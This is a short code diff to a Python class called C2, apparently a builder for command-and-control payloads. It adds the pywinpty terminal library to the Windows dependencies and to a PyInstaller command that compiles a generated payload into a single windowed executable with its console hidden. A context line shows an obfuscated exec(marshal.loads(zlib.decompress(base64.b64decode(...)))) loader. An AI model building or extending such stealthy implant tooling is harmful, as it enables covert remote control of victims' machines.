@@ -241,7 +241,8 @@ class C2:
         requ_numpy="1.24.4"
 
         if os_name == "Windows":
-            requ_numpy = "2.2.1"
+            requ_numpy = """2.2.1
+pywinpty"""
 
         with open('requirements.txt', 'w') as f:
             f.writelines("""
@@ -291,7 +292,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         try:
             if os_name == "Windows":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=NONE --hidden-import=pypiwin32 --hidden-import=pycryptodome --hidden-import=pywinpty --hidden-import=pyautogui --version-file=version_info.txt --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
